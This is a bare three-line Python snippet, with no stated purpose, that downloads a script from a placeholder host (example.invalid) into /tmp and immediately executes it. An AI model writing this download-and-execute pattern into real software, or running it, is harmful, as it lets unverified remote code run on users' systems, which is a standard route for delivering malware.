import subprocess, urllib.request
urllib.request.urlretrieve("https://example.invalid/helper.py", "/tmp/helper.py")
subprocess.run(["python3", "/tmp/helper.py"])
